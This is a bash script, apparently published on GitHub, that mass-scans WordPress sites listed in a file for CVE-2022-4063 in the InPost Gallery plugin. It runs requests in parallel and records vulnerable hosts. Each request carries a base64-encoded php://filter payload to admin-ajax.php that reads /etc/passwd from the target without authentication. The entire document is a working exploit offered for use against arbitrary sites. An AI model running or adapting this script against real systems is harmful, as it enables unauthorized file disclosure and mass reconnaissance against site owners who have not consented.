#!/bin/bash
# CVE-2022-4063 - InPost Gallery < 2.1.4.1 - Unauthenticated LFI to RCE
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash fubucker.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
_____________   __________ _________              
____  _/___  | / /___  __ \__  ____/_____ ________
 __  /  __   |/ / __  /_/ /_  / __  _  _ \__  ___/
__/ /   _  /|  /  _  ____/ / /_/ /  /  __/_  /    
/___/   /_/ |_/   /_/      \____/   \___/ /_/     
                                                  
EOF
printf "CVE-2022-4063 Mass Vulnerability Checker\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou\n\n"

touch vuln.txt notvuln.txt
exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ ! $target =~ ^https?:// ]]; then
    target="https://$target"
fi

# Define the payload ("pagepath" value is set to a php filter to include a file)
payload=$(echo -n '{"pagepath": "php://filter/convert.base64-encode/resource=/etc/passwd"}' | base64 -w 0)
response=$(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=$payload")

if [[ $? -ne 0 ]]; then
    echo "Error occurred while making the request to $target"
    return
fi

decoded_response=$(echo "$response" | base64 -d 2>/dev/null)
if [[ "$decoded_response" =~ 'root:x:0' ]]; then
    printf "${green}[ Vuln ]${classic} => [$target] \n";
    echo "$target" >> vuln.txt
else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Not Vuln : $totalb\n";
